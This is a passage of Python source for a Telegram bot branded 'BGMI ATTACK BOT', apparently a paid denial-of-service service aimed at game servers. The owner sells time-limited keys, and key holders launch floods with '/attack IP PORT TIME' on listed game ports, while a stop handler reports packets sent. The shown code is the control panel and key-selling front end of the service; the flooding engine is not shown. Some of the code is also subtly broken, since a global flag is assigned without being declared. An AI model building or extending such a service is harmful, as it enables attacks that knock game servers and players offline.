    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    
    n = clear_vids()
    await msg.reply_text(
        f"🗑️ {n} videos cleared!",
        reply_markup=back_to_menu_kb(True)
    )

# ═══════════════ KEY COMMANDS ═══════════════
@app.on_message(filters.command("genkey") & filters.private)
async def genkey_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    
    parts = msg.text.split()
    if len(parts) != 3:
        return await msg.reply_text(
            f"⚿ GENKEY\n\n"
            f"Use: /genkey NAME TIME\n\n"
            f"Examples:\n"
            "/genkey Premium 7d\n"
            "/genkey VIP 30m\n"
            "/genkey Test 24h\n\n"
            f"Units: m=min, h=hour, d=day, w=week, mo=month",
            reply_markup=back_to_menu_kb(True)
        )
    
    name = parts[1]
    time_str = parts[2]
    
    key_code, duration = create_key(name, time_str)
    
    if key_code:
        await msg.reply_text(
            f"⚿ KEY GENERATED\n\n"
            f"{LINE}\n"
            f"🪪 Name: {name}\n"
            f"⏱️ Duration: {duration}\n"
            f"🔑 Key: `{key_code}`\n"
            f"{LINE}\n\n"
            f"📋 User: /redeem {key_code}",
            reply_markup=back_to_menu_kb(True)
        )
    else:
        await msg.reply_text(
            f"❌ Invalid time format!\n\nUse: 30m, 1h, 7d, 2w, 1mo",
            reply_markup=back_to_menu_kb(True)
        )

@app.on_message(filters.command("admin_keys") & filters.private)
async def admin_keys_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    
    keys = get_keys()
    active = [k for k, v in keys.items() if v["active"]]
    used = [k for k, v in keys.items() if not v["active"]]
    await msg.reply_text(
        f"⌘ ALL KEYS\n\n{LINE}\n"
        f"🟢 Active: {len(active)}\n"
        f"🔴 Used: {len(used)}\n"
        f"📊 Total: {len(keys)}\n{LINE}",
        reply_markup=back_to_menu_kb(True)
    )

@app.on_message(filters.command("admin_stats") & filters.private)
async def admin_stats_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    
    vids = get_vids()
    users = get_users()
    await msg.reply_text(
        f"⎙ STATS\n\n{LINE}\n"
        f"📹 Videos: {len(vids)}\n"
        f"💎 Premium: {len(users.get('premium', []))}\n"
        f"🔑 Key Users: {len(users.get('keys', {}))}\n"
        f"⚡ Attack: {'🟢 On' if attacking else '💤 Idle'}\n"
        f"{LINE}\n"
        f"⚙️ Settings:\n"
        f"⏱️ Sticker Time: {get_sticker_display_time()}s\n"
        f"⏱️ Video Delay: {get_video_delay_time()}s",
        reply_markup=back_to_menu_kb(True)
    )

@app.on_message(filters.command("admin_clear") & filters.private)
async def admin_clear_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    
    removed = remove_expired()
    await msg.reply_text(
        f"↺ {removed} expired keys removed!",
        reply_markup=back_to_menu_kb(True)
    )

# ═══════════════ SEND VIDEO HELPER ═══════════════
async def send_vid(chat_id, text, kb=None, vid=None):
    if vid is None: vid = rand_vid()
    try:
        if vid and os.path.exists(vid["path"]):
            return await app.send_video(chat_id, vid["path"], caption=text, reply_markup=kb)
        return await app.send_message(chat_id, text, reply_markup=kb)
    except:
        return await app.send_message(chat_id, text, reply_markup=kb)

# ═══════════════ CALLBACK QUERY HANDLER ═══════════════
@app.on_callback_query()
async def callback_handler(client, cb: CallbackQuery):
    data = cb.data
    uid = cb.from_user.id
    is_owner = (uid == OWNER_ID)
    
    # ═══════ SEPARATOR ═══════
    if data == "sep":
        await cb.answer()
        return
    
    # ═══════ ABOUT REDEEM POPUP ═══════
    if data == "redeem_popup":
        await cb.answer(
            f"🪪 About Redeem ♡\n\n"
            f"🔑 How To Redeem Key?\n\n"
            f"1️⃣ Get Key From Admin\n"
            f"📲 @{OWNER_USERNAME}\n\n"
            f"2️⃣ Use Command:\n"
            "/redeem YOUR_KEY\n\n"
            f"3️⃣ Example:\n"
            "/redeem BGMI-XXXX-XXXX-XXXX\n\n"
            f"⏱️ Durations:\n"
            "30m • 1h • 24h • 7d • 2w • 1mo\n\n"
            f"💎 Premium = Power!",
            show_alert=True
        )
        return
    
    # ═══════ COMMANDS MENU ═══════
    if data == "commands_menu":
        commands_text = get_commands_list(is_owner)
        formatted_text = commands_text.replace("{OWNER_LINK}", OWNER_LINK).replace("{BOT_USERNAME}", BOT_USERNAME)
        await cb.message.edit_text(formatted_text, reply_markup=back_to_menu_kb(is_owner))
        await cb.answer("📝 Commands List")
        return
    
    # ═══════ MAIN MENU ═══════
    if data == "menu":
        await cb.answer(f"⌂ Going to Menu")
        user = cb.from_user
        info = get_user_info(uid)
        kb = main_menu_kb(is_owner)
        
        expiry_text = ""
        if info.get("remaining"): expiry_text += f"\n⏳ Remaining: {info['remaining']}"
        if info.get("expiry"):
            try:
                exp = datetime.fromisoformat(info["expiry"])
                expiry_text += f"\n📅 Expires: {exp.strftime('%d %b %Y, %I:%M %p')}"
            except: pass
        
        text = (
            f"💀 BGMI ATTACK BOT 💀\n\n"
            f"{LINE}\n"
            f"👤 {user.first_name}\n"
            f"🆔 {uid}\n"
            f"💳 {info['type']}{expiry_text}\n"
            f"{LINE}\n"
            f"⚡ {info['threads']} Threads\n"
            f"⏱️ {info['max_time']}s Max Time\n"
            f"📹 {len(get_vids())} Videos\n"
            f"{LINE}\n"
            "⚔️ /attack IP PORT TIME\n"
            "📋 /attack 1.2.3.4 8080 600\n"
            f"🎮 BGMI Ports: 7000-15000\n"
            f"{LINE}\n"
            f"🔽 SELECT OPTION:"
        )
        await cb.message.edit_text(text, reply_markup=kb)
        return
    
    # ═══════ ATTACK MENU ═══════
    if data == "attack_menu":
        # Checking message show karein
        checking_msg = await cb.message.reply_text(
            f"🔍 **SYSTEM SCAN INITIATED...**\n\n"
            f"▫️ 🔐 Verifying user credentials...\n"
            f"▫️ 📡 Connecting to secure server...\n"
            f"▫️ 🔑 Checking subscription status..."
        )
        
        await asyncio.sleep(0.5)
        
        access, a_type = check_access(uid)
        if not access:
            await checking_msg.edit_text(
                f"🚫 ACCESS DENIED\n\n"
                f"╔══════════════════════════╗\n"
                f"║  ❌ INVALID CREDENTIALS\n"
                f"║  🔒 No Active Plan\n"
                f"║  🚫 Access Blocked\n"
                f"╚══════════════════════════╝\n\n"
                f"🔑 You don't have any active plan!\n\n"
                f"👑 Contact: @{OWNER_USERNAME}"
            )
            return
        
        await checking_msg.delete()
        
        info = get_user_info(uid)
        text = (
            f"💀 ATTACK MENU\n\n"
            f"{LINE}\n"
            f"⚔️ /attack IP PORT TIME\n"
            f"📋 /attack 1.2.3.4 8080 600\n"
            f"{LINE}\n"
            f"🎮 BGMI: 7000-15000\n"
            f"⚡ {info['threads']} Threads\n"
            f"⏱️ {info['max_time']}s Max (10 Minutes)\n"
            f"💳 {a_type}"
        )
        await cb.message.edit_text(text, reply_markup=back_to_menu_kb(is_owner))
        await cb.answer("⚔ Attack Menu")
        return
    
    # ═══════ INFO MENU ═══════
    if data == "info_menu":
        info = get_user_info(uid)
        history = get_user_history(uid)
        text = f"ⓘ USER INFO\n\n{LINE}\n👤 {cb.from_user.first_name}\n🆔 {uid}\n💳 {info['type']}\n"
        if info.get("remaining"): text += f"⏳ Remaining: {info['remaining']}\n"
        if info.get("expiry"):
            try:
                exp = datetime.fromisoformat(info["expiry"])
                text += f"📅 Expires: {exp.strftime('%d %b, %I:%M %p')}\n"
            except: pass
        text += f"\n{LINE}\n▓ ATTACK HISTORY:\n"
        if history:
            for h in history[-5:]:
                try:
                    t = datetime.fromisoformat(h['time']).strftime('%d %b %I:%M %p')
                    text += f"• {t} - {h['action']}\n"
                except: pass
        else:
            text += f"• No attacks yet!\n"
        text += f"\n{LINE}\n📹 Videos: {len(get_vids())}"
        await cb.message.edit_text(text, reply_markup=back_to_menu_kb(is_owner))
        await cb.answer("ⓘ User Info")
        return
    
    # ═══════ REDEEM MENU ═══════
    if data == "redeem_menu":
        access, a_type = check_access(uid)
        if access:
            info = get_user_info(uid)
            await cb.message.edit_text(
                f"✅ ACCESS ACTIVE\n\n{LINE}\n💳 {a_type}\n⏳ {info.get('remaining', 'N/A')}\n{LINE}\nUse /attack to start!",
                reply_markup=back_to_menu_kb(is_owner)
            )
        else:
            await cb.message.edit_text(
                f"⚿ REDEEM KEY\n\n{LINE}\n📋 /redeem KEY\n🔑 /redeem BGMI-XXXX-XXXX-XXXX\n{LINE}\n📲 [FATHER OF BOT]({OWNER_LINK})\n\n⏱️ 30m | 24h | 7d | 2w | 1mo",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton(f"🪪 About Redeem ♡", callback_data="redeem_popup")],
                    [InlineKeyboardButton("📲 Contact-Father", url=OWNER_LINK)],
                    [InlineKeyboardButton(f"⌂ MAIN MENU", callback_data="menu")]
                ])
            )
        await cb.answer("⚿ Redeem Menu")
        return
    
    # ═══════ STOP ATTACK ═══════
    if data == "stop_attack":
        if not check_access(uid)[0]:
            await cb.answer("🔒 Access Denied!", show_alert=True)
            return
        
        if attacking and (uid == attack_user or uid == OWNER_ID):
            stop_sticker = get_stop_sticker()
            if stop_sticker:
                try:
                    await cb.message.reply_sticker(stop_sticker)
                except:
                    pass
            
            attacker.on = False
            attacking = False
            
            await cb.answer("✅ Attack Stopped!", show_alert=True)
            await cb.message.edit_text(
                f"✅ ATTACK TERMINATED\n\n"
                f"╔══════════════════════════╗\n"
                f"║  ✅ Target Neutralized\n"
                f"║  📦 {attacker.pkts:,} Packets\n"
                f"║  🛑 Attack Stopped\n"
                f"╚══════════════════════════╝\n\n"
                f"🔄 /attack IP PORT TIME"
            )
        else:
            await cb.answer("💤 No attack running!", show_alert=True)
        return
    
    # ═══════ ADMIN MENU ═══════
    if data == "admin_menu":
        if not is_owner:
            await cb.answer("Owner only!", show_alert=True)
            return
        await cb.message.edit_text(
            f"⚜ ADMIN PANEL\n\n{LINE}\n🔽 Select:",
            reply_markup=admin_kb()
        )
        await cb.answer("⚜ Admin Panel")
        return
    
    # ═══════ ADMIN AUTO ═══════
    if data == "admin_auto":
        if not is_owner:
            await cb.answer("Owner only!", show_alert=True)
            return
        await cb.message.edit_text(
            f"⚜ AUTO GEN KEY\n\n{LINE}\n🔽 Select Duration:",
            reply_markup=auto_key_kb()
        )
        await cb.answer("⚜ Auto Generate Key")
        return
    
    # ═══════ ADMIN ADD KEY ═══════
    if data == "admin_addkey":
        if not is_owner:
            await cb.answer("Owner only!", show_alert=True)
            return
        await cb.answer(
            f"⚿ ADD KEY\n\n"
            f"Use: /genkey NAME TIME\n\n"
            f"Examples:\n"
            "/genkey Test 30m\n"
            "/genkey VIP 24h\n"
            "/genkey Premium 7d\n\n"
            f"Units: m=min, h=hour, d=day, w=week, mo=month",
            show_alert=True
        )
        return
    
    # ═══════ ADMIN KEYS ═══════
    if data == "admin_keys":
        if not is_owner:
            await cb.answer("Owner only!", show_alert=True)
            return
        keys = get_keys()
        active = [k for k, v in keys.items() if v["active"]]
        used = [k for k, v in keys.items() if not v["active"]]
        await cb.message.edit_text(
            f"⌘ ALL KEYS\n\n{LINE}\n"
            f"🟢 Active: {len(active)}\n"
            f"🔴 Used: {len(used)}\n"
            f"📊 Total: {len(keys)}\n{LINE}",
            reply_markup=admin_kb()
        )
        await cb.answer("⌘ All Keys")
        return
    
    # ═══════ ADMIN STATS ═══════
    if data == "admin_stats":
        if not is_owner:
            await cb.answer("Owner only!", show_alert=True)
            return
        vids = get_vids()
        users = get_users()
        await cb.message.edit_text(
            f"⎙ STATS\n\n{LINE}\n"
            f"📹 Videos: {len(vids)}\n"
            f"💎 Premium: {len(users.get('premium', []))}\n"
            f"🔑 Key Users: {len(users.get('keys', {}))}\n"
            f"⚡ Attack: {'🟢 On' if attacking else '💤 Idle'}\n"
            f"{LINE}\n"
            f"⚙️ Settings:\n"
            f"⏱️ Sticker Time: {get_sticker_display_time()}s\n"
            f"⏱️ Video Delay: {get_video_delay_time()}s",
            reply_markup=admin_kb()
        )
        await cb.answer("⎙ Statistics")
        return
    
    # ═══════ ADMIN CLEAR ═══════
    if data == "admin_clear":
        if not is_owner:
            await cb.answer("Owner only!", show_alert=True)
            return
        removed = remove_expired()
        await cb.answer(f"↺ {removed} expired removed!", show_alert=True)
        return
    
    # ═══════ VIDEO MANAGER ═══════
    if data == "video_menu":
        if not is_owner:
            await cb.answer("Owner only!", show_alert=True)
            return
        vids = get_vids()
        await cb.message.edit_text(
            f"▶ VIDEO MANAGER\n\n"
            f"🔹 Total Videos: {len(vids)}\n"
            f"🔹 Commands:\n"
            f"• /addvideo - Reply to video\n"
            f"• /delvideo ID - Delete by ID\n"
            f"• /videos - List all videos\n"
            f"• /clearvideos - Clear all\n"
            f"• /setvideodelay seconds - Set video delay\n\n"
            f"⏱️ Video Delay: {get_video_delay_time()}s\n"
            f"✨ Videos appear randomly in welcome!",
            reply_markup=video_kb()
        )
        await cb.answer("▶ Video Manager")
        return
    
    # ═══════ VIDEO BUTTONS ═══════
    if data == "v_add":
        if not is_owner:
            await cb.answer("Owner only!", show_alert=True)
            return
        await cb.message.edit_text(
            f"⎘ ADD VIDEO\n\n"
            f"Reply to a video with:\n"
            "`/addvideo`\n\n"
            f"✨ The video will be added to welcome animation!",
            reply_markup=video_kb()
        )
        await cb.answer("⎘ Add Video")
        return
    
    if data == "v_del":
        if not is_owner:
            await cb.answer("Owner only!", show_alert=True)
            return
        vids = get_vids()
        if not vids:
            await cb.answer("No videos to delete!", show_alert=True)
            return
        await cb.message.edit_text(
            f"⌫ DELETE VIDEO\n\n"
            f"Use: /delvideo ID\n\n"
            f"Get ID from /videos command.",
            reply_markup=video_kb()
        )
        await cb.answer("⌫ Delete Video")
        return
    
    if data == "v_list":
        if not is_owner:
            await cb.answer("Owner only!", show_alert=True)
            return
        vids = get_vids()
        if not vids:
            await cb.answer("No videos added yet!", show_alert=True)
            return
        text = f"⌘ VIDEO LIST\n\n"
        for v in vids[:15]:
            text += f"#{v['id']} {v['name'][:30]}\n"
        text += f"\n🔹 Total: {len(vids)}"
        text += f"\n⏱️ Video Delay: {get_video_delay_time()}s"
        await cb.message.edit_text(text, reply_markup=video_kb())
        await cb.answer("⌘ Video List")
        return
    
    if data == "v_clear":
        if not is_owner:
            await cb.answer("Owner only!", show_alert=True)
            return
        n = clear_vids()
        await cb.answer(f"🗑️ {n} videos cleared!", show_alert=True)
        await cb.message.edit_text(
            f"⎚ VIDEOS CLEARED\n\n"
            f"🔹 Total Videos: 0",
            reply_markup=video_kb()
        )
        return
    
    if data == "v_help":
        await cb.message.edit_text(
            f"❓ VIDEO HELP\n\n"
            f"{LINE}\n"
            f"📤 Add: Reply + /addvideo\n"
            f"📋 List: /videos\n"
            f"🗑️ Delete: /delvideo ID\n"
            f"🧹 Clear: /clearvideos\n"
            f"⏱️ Set Delay: /setvideodelay seconds\n"
            f"{LINE}",
            reply_markup=video_kb()
        )
        await cb.answer("❓ Video Help")
        return
    
    # ═══════ EMOJI MANAGER ═══════
    if data == "emoji_menu":
        if not is_owner:
            await cb.answer("Owner only!", show_alert=True)
            return
        emojis = get_all_emojis()
        await cb.message.edit_text(
            f"★ EMOJI MANAGER\n\n"
            f"🔹 Total Emojis: {len(emojis)}\n"
            f"🔹 Commands:\n"
            f"• /addemoji - Reply to premium emoji\n"
            f"• /removeemoji index - Remove by index\n"
            f"• /listemojis - List all emojis\n"
            f"• /resetemojis - Reset all\n\n"
            f"✨ Emojis appear randomly in welcome!",
            reply_markup=emoji_kb()
        )
        await cb.answer("★ Emoji Manager")
        return
    
    # ═══════ EMOJI BUTTONS ═══════
    if data == "e_add":
        if not is_owner:
            await cb.answer("Owner only!", show_alert=True)
            return
        await cb.message.edit_text(
            f"⎘ ADD EMOJI\n\n"
            f"Reply to a premium emoji with:\n"
            "`/addemoji`\n\n"
            f"✨ The emoji will be added to welcome animation!",
            reply_markup=emoji_kb()
        )
        await cb.answer("⎘ Add Emoji")
        return
    
    if data == "e_remove":
        if not is_owner:
            await cb.answer("Owner only!", show_alert=True)
            return
        emojis = get_all_emojis()
        if not emojis:
            await cb.answer("No emojis to remove!", show_alert=True)
            return
        await cb.message.edit_text(
            f"⌫ REMOVE EMOJI\n\n"
            f"Use: /removeemoji index\n\n"
            f"Get index from /listemojis command.",
            reply_markup=emoji_kb()
        )
        await cb.answer("⌫ Remove Emoji")
        return
    
    if data == "e_list":
        if not is_owner:
            await cb.answer("Owner only!", show_alert=True)
            return
        emojis = get_all_emojis()
        if not emojis:
            await cb.answer("No emojis added yet!", show_alert=True)
            return
        text = f"⌘ EMOJI LIST\n\n"
        for i, emoji_id in enumerate(emojis, 1):
            text += f"**{i}.** `{emoji_id[:30]}...`\n"
        text += f"\n🔹 Total: {len(emojis)}"
        await cb.message.edit_text(text, reply_markup=emoji_kb())
        await cb.answer("⌘ Emoji List")
        return
    
    if data == "e_reset":
        if not is_owner:
            await cb.answer("Owner only!", show_alert=True)
            return
        reset_emojis()
        await cb.answer("🔄 All emojis reset!", show_alert=True)
        await cb.message.edit_text(
            f"↺ EMOJIS RESET\n\n"
            f"🔹 Total Emojis: 0\n\n"
            f"All emojis removed from the list.",
            reply_markup=emoji_kb()
        )
        return
    
    # ═══════ STICKER MANAGER ═══════
    if data == "sticker_menu":
        if not is_owner:
            await cb.answer("Owner only!", show_alert=True)
            return
        stickers = get_all_stickers()
        sticker_times = get_sticker_times()
        text = f"❄ STICKER MANAGER\n\n"
        text += f"🔹 Total Stickers: {len(stickers)}\n"
        if stickers:
            text += f"🔹 Sticker Times:\n"
            for i, sid in enumerate(stickers[:5], 1):
                time = sticker_times.get(sid, get_sticker_display_time())
                text += f"   #{i}: {time}s\n"
        text += f"\n🔹 Commands:\n"
        text += f"• /addsticker - Reply to sticker (Auto-detect)\n"
        text += f"• /removesticker index - Remove by index\n"
        text += f"• /liststickers - List all stickers\n"
        text += f"• /resetstickers - Reset all\n"
        text += f"• /setstickertime index seconds - Set single sticker\n"
        text += f"• /setallstickertime seconds - Set ALL stickers\n\n"
        text += f"⏱️ Default Time: {get_sticker_display_time()}s\n"
        text += f"⏱️ Video Delay: {get_video_delay_time()}s\n"
        text += f"✨ Stickers appear randomly in welcome animation!"
        await cb.message.edit_text(text, reply_markup=sticker_kb())
        await cb.answer("❄ Sticker Manager")
        return
    
    # ═══════ STICKER BUTTONS ═══════
    if data == "s_add":
        if not is_owner:
            await cb.answer("Owner only!", show_alert=True)
            return
        await cb.message.edit_text(
            f"⎘ ADD STICKER\n\n"
            f"Reply to a sticker with:\n"
            "`/addsticker`\n\n"
            f"⏱️ Auto-Detect: Duration will be detected automatically!\n"
            f"✨ The sticker will be added to welcome animation!",
            reply_markup=sticker_kb()
        )
        await cb.answer("⎘ Add Sticker")
        return
    
    if data == "s_remove":
        if not is_owner:
            await cb.answer("Owner only!", show_alert=True)
            return
        stickers = get_all_stickers()
        if not stickers:
            await cb.answer("No stickers to remove!", show_alert=True)
            return
        await cb.message.edit_text(
            f"⌫ REMOVE STICKER\n\n"
            f"Use: /removesticker index\n\n"
            f"Get index from /liststickers command.",
            reply_markup=sticker_kb()
        )
        await cb.answer("⌫ Remove Sticker")
        return
    
    if data == "s_list":
        if not is_owner:
            await cb.answer("Owner only!", show_alert=True)
            return
        stickers = get_all_stickers()
        if not stickers:
            await cb.answer("No stickers added yet!", show_alert=True)
            return
        sticker_times = get_sticker_times()
        text = f"⌘ STICKER LIST\n\n"
        for i, sticker_id in enumerate(stickers, 1):
            time = sticker_times.get(sticker_id, get_sticker_display_time())
            text += f"**{i}.** `{sticker_id[:25]}...` ⏱️ {time}s\n"
        text += f"\n🔹 Total: {len(stickers)}"
        text += f"\n\n📋 Settings: Sticker Time: {get_sticker_display_time()}s | Video Delay: {get_video_delay_time()}s"
        await cb.message.edit_text(text, reply_markup=sticker_kb())
        await cb.answer("⌘ Sticker List")
        return
    
    if data == "s_reset":
        if not is_owner:
            await cb.answer("Owner only!", show_alert=True)
            return
        reset_stickers()
        await cb.answer("🔄 All stickers reset!", show_alert=True)
        await cb.message.edit_text(
            f"↺ STICKERS RESET\n\n"
            f"🔹 Total Stickers: 0\n\n"
            f"All stickers removed from the list.",
            reply_markup=sticker_kb()
        )
        return
    
    # ═══════ AUTO KEY GENERATION ═══════
    auto_keys = {
        "ak_20m": ("20min", "20m"), "ak_40m": ("40min", "40m"), "ak_60m": ("60min", "60m"),
        "ak_1d": ("1day", "1d"), "ak_3d": ("3day", "3d"), "ak_7d": ("7day", "7d"),
        "ak_15d": ("15day", "15d"), "ak_23d": ("23day", "23d"), "ak_30d": ("30day", "30d"),
        "ak_1mo": ("1month", "1mo"), "ak_2mo": ("2month", "2mo"), "ak_3mo": ("3month", "3mo"),
    }
    
    if data in auto_keys:
        if not is_owner:
            await cb.answer("Owner only!", show_alert=True)
            return
        name, time_str = auto_keys[data]
        key_code, duration = create_key(name, time_str)
        if key_code:
            await cb.message.edit_text(
                f"⚿ KEY GENERATED\n\n{LINE}\n🪪 {name}\n⏱️ {duration}\n🔑 {key_code}\n{LINE}\n\n📋 User: /redeem {key_code}",
                reply_markup=auto_key_kb()
            )
            await cb.answer("✅ Key Generated!")
        else:
            await cb.answer("❌ Failed!", show_alert=True)
        return
    
    # ═══════ DEFAULT ═══════
    await cb.answer("🔧 Processing...")

# ═══════════════ AUTO EXPIRE ═══════════════
async def auto_expire():
    while True:
        await asyncio.sleep(300)
        remove_expired()

# ═══════════════ INIT ═══════════════
for f, d in [
    (VIDEO_DB, []), 
    (USERS_DB, {"premium": [], "keys": {}}), 
    (KEYS_DB, {}), 
    (BLOCKED_DB, []), 
    (HISTORY_DB, {}), 
    (STICKER_DB, {"stickers": []}),
    (EMOJI_DB, {"emojis": []}),
    (STICKER_TIME_DB, {}),
    (SETTINGS_DB, {"sticker_time": DEFAULT_STICKER_TIME, "video_delay": DEFAULT_VIDEO_DELAY}),
    (STOP_STICKER_DB, {"sticker_id": None})
]:
    if not os.path.exists(f): jsave(f, d)

os.makedirs("downloads", exist_ok=True)
asyncio.get_event_loop().create_task(auto_expire())

print("""
╔══════════════════════════════════════╗
║  💀 BGMI ATTACK BOT - ULTRA PRO     ║
║  ✅ SAB KUCH FIXED                   ║
║  ✅ STATUS BUTTON WORKING            ║
║  ✅ ATTACK CHECKING MSG WORKING      ║
║  ✅ ABOUT REDEEM POPUP WORKING       ║
║  ✅ COMMANDS BUTTON WORKING          ║
║  ✅ EMOJI COMPLETE HOKE DELETE       ║
║  ✅ STICKER COMPLETE HOKE WELCOME    ║
║  ✅ ALL BUTTONS WORKING              ║
║  SIRF INLINE BUTTONS                 ║
╚══════════════════════════════════════╝
✅ Bot Ready!
""")

if __name__ == "__main__":
    app.run()
